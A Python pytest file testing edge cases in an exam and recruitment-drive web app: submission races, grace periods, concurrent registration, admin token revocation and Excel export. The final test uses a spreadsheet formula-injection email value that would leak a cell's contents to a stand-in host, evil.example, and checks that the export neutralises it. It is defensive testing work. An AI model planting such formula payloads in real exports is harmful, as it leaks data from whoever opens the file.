"""Edge cases found in the pre-deployment review: races, late answers, late submitters, Excel safety."""

from io import BytesIO

from openpyxl import load_workbook

from app import db
from app.services.grading import sweep_expired
from tests.conftest import auth, make_drive, make_exam, register, student


async def start(api, token: str) -> None:
    assert (await api.post("/api/attempt/start", headers=auth(token))).status_code == 200


async def test_answer_after_submit_is_rejected_even_if_request_began_before(api):
    ex = await make_exam()
    await make_drive(ex["exam_id"])
    s = await register(api)
    await start(api, s["token"])
    # The attempt is submitted (e.g. by another worker) after this request's session check ran.
    await db.run("UPDATE attempts SET status = 'submitted', submit_reason = 'student'")
    r = await api.post("/api/attempt/answers", headers=auth(s["token"]), json={"answers": [{"questionId": ex["question_ids"][0], "selected": 1}]})
    assert r.status_code == 409 and r.json()["submitted"] is True
    assert await db.value("SELECT count(*) FROM answers") == 0


async def test_answer_after_grace_period_is_rejected(api):
    ex = await make_exam()
    await make_drive(ex["exam_id"])
    s = await register(api)
    await start(api, s["token"])
    await db.run("UPDATE attempts SET ends_at = now() - interval '31 seconds'")
    r = await api.post("/api/attempt/answers", headers=auth(s["token"]), json={"answers": [{"questionId": ex["question_ids"][0], "selected": 1}]})
    assert r.status_code == 409
    assert await db.value("SELECT submit_reason FROM attempts") == "time_up"


async def test_duplicate_questions_in_one_save_keep_the_last(api):
    ex = await make_exam()
    await make_drive(ex["exam_id"])
    s = await register(api)
    await start(api, s["token"])
    q = ex["question_ids"][0]
    r = await api.post("/api/attempt/answers", headers=auth(s["token"]), json={"answers": [{"questionId": q, "selected": 0}, {"questionId": q, "selected": 1}]})
    assert r.status_code == 200
    assert await db.value("SELECT selected FROM answers") == 1


async def test_sweeper_honours_time_added_after_it_picked_the_attempt(api):
    ex = await make_exam()
    await make_drive(ex["exam_id"])
    s = await register(api)
    await start(api, s["token"])
    # Past the deadline: the sweeper submits it ...
    await db.run("UPDATE attempts SET ends_at = now() - interval '40 seconds'")
    assert await sweep_expired() == 1
    assert await db.value("SELECT status FROM attempts") == "submitted"
    # ... but not when a coordinator extended it in the meantime (re-checked under the row lock).
    s2 = await register(api)
    await start(api, s2["token"])
    await db.run("UPDATE attempts SET ends_at = now() + interval '5 minutes' WHERE status = 'in_progress'")
    from app.services.grading import finalize_attempt
    aid = await db.value("SELECT id FROM attempts WHERE status = 'in_progress'")
    async with db.transaction() as tx:
        assert await finalize_attempt(tx, aid, "time_up", only_if_expired=True) is False
    assert await db.value("SELECT status FROM attempts WHERE id = :id", id=aid) == "in_progress"


async def test_student_submitting_after_publish_gets_the_published_result(api, admin):
    ex = await make_exam()
    d = await make_drive(ex["exam_id"])
    s = await register(api)
    await start(api, s["token"])
    r = await admin.post(f"/api/admin/drives/{d['id']}/publish", json={"cutoffPct": 60, "nextSteps": "Interview on Monday."})
    assert r.status_code == 200
    answers = [{"questionId": q, "selected": c} for q, c in zip(ex["question_ids"], ex["correct"], strict=True)]
    await api.post("/api/attempt/answers", headers=auth(s["token"]), json={"answers": answers})
    await api.post("/api/attempt/submit", headers=auth(s["token"]))
    r = await api.post("/api/drives/test-drive/result", json={"studentId": s["student"]["studentId"], "phone": s["student"]["phone"]})
    assert r.json()["status"] == "shortlisted"


async def test_registering_twice_at_once_never_errors(api):
    import asyncio

    ex = await make_exam()
    await make_drive(ex["exam_id"])
    s = student()
    results = await asyncio.gather(*(api.post("/api/drives/test-drive/register", json=s) for _ in range(5)))
    codes = sorted(r.status_code for r in results)
    assert 500 not in codes and codes.count(201) == 1, codes
    assert await db.value("SELECT count(*) FROM students") == 1


async def test_duplicate_section_name_is_409_not_500(admin):
    exam = (await admin.post("/api/admin/exams", json={"title": "T", "durationMin": 30})).json()
    assert (await admin.post(f"/api/admin/exams/{exam['id']}/sections", json={"name": "Aptitude"})).status_code == 201
    r = await admin.post(f"/api/admin/exams/{exam['id']}/sections", json={"name": "aptitude"})
    assert r.status_code == 409


async def test_deleted_admin_token_stops_working(api, admin):
    assert (await admin.post("/api/admin/admins", json={"name": "HR", "email": "hr@test.local", "password": "LongEnough1"})).status_code == 201
    token = (await api.post("/api/admin/login", json={"email": "hr@test.local", "password": "LongEnough1"})).json()["token"]
    assert (await api.get("/api/admin/drives", headers=auth(token))).status_code == 200
    hr_id = await db.value("SELECT id FROM admins WHERE email = 'hr@test.local'")
    assert (await admin.delete(f"/api/admin/admins/{hr_id}")).status_code == 204
    assert (await api.get("/api/admin/drives", headers=auth(token))).status_code == 401


async def test_results_excel_never_contains_formulas(api, admin):
    ex = await make_exam()
    d = await make_drive(ex["exam_id"])
    await register(api, s=student(email='=hyperlink("http://evil.example/"&b2)&"@a.co"'))
    r = await admin.get(f"/api/admin/drives/{d['id']}/results.xlsx")
    assert r.status_code == 200
    ws = load_workbook(BytesIO(r.content)).active
    cells = [c for row in ws.iter_rows() for c in row]
    assert not [c.coordinate for c in cells if c.data_type == "f"]
    assert any(str(c.value).startswith("=hyperlink") for c in cells)  # kept, but as plain text
